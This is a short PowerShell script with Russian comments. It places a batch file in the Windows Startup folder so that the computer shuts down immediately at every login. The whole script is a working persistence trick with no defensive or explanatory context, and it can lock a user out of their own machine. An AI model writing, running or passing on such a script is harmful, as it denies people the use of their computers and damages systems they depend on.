# Определяем путь к папке автозагрузки
$startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Путь к batch-файлу
$batchFile = [System.IO.Path]::Combine($startupPath, "shutdown.bat")

# Команда для выключения компьютера
$shutdownCommand = "@echo off`r`nshutdown /s /t 0"

# Создаём batch-файл с командой
Set-Content -Path $batchFile -Value $shutdownCommand -Encoding ASCII

Write-Host "Файл $batchFile создан. Компьютер будет выключаться при входе в систему."